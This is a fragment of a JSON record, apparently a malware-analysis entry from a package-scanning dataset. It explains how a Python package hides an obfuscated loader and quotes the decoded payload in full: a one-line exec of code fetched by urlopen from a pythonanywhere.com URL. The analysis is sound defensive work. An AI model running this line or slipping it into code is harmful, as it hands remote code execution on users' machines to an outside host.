      "malicious_behavior": "The code imports two obfuscated names from a relative module and then immediately executes a base64-decoded payload using exec. The decoded payload is: exec(__import__('importlib').import_module('urllib.request').urlopen('https://cyberresearch.pythonanywhere.com/reporter.py').read().decode()). This means the code downloads Python code from a suspicious, non-official URL (pythonanywhere.com domain, which is often abused for malicious hosting) and executes it directly in memory without any validation or user consent. This pattern of fetching remote code and executing it dynamically is a classic hallmark of malicious behavior, enabling remote code execution, payload delivery, or data exfiltration. The use of base64 encoding to obfuscate the URL and the immediate execution of the downloaded code without any checks strongly indicates malicious intent. There is no legitimate reason for such behavior in typical Python packages or applications, and it matches multiple critical risk indicators such as code obfuscation, remote code execution, and use of suspicious external URLs."
